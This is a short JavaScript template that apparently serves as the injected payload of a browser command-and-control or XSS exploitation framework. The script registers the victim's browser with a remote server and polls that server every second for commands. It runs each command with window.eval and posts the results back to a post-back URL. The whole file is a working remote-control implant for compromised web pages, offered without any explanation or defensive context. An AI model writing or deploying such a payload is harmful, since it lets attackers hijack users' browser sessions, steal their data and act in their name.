(function (config) {
    let $ = JJ;;

    function register() {
        $.ajax({
            async: false,
            method: 'POST',
            url: config.registerUrl,
            data: {
                user_agent: navigator.userAgent
            },
            success: function (data) {
                if (data.status === 200) {
                    config['id'] = data['id'];
                }
            }
        })
    }

    function pollForNewCommands() {
        setInterval(function() {
            $.ajax({
                method: "GET",
                url: config.pollingUrl,
                data: {
                    id: config.id
                },
                success: function(data) {
                    if (data.status === 200) {
                        const result = executeCommandInContext(data.command);
                        postBackOutput(result, data.command);
                    }
                }
            });
        }, config.pollingRate)
    }

    function executeCommandInContext(command) {
        const geval = window.eval;
        return JSON.prune(geval(command.text));
    }

    function postBackOutput(result, command) {
        $.ajax({
            method: "POST",
            url: config.postBackUrl,
            data: {
                output: result,
                id: command.id
            }
        })
    }

    register();
    pollForNewCommands();

})({
    pollingRate: 1000,
    postBackUrl: "{{ post_back_url }}",
    pollingUrl: "{{ poll_url }}",
    registerUrl: "{{ register_url }}"
});